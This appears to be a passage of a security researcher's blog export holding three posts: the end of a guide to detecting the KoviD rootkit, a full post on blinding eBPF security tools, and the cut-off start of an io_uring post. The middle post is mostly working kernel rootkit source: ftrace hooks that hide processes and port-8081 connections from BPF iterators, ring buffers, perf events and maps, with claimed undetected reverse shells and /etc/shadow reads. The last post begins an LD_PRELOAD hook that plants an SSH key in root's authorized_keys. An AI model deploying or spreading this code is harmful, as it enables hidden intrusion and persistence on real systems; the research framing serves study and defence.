make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks — specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And several other things.\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And several other things.\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks — specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; 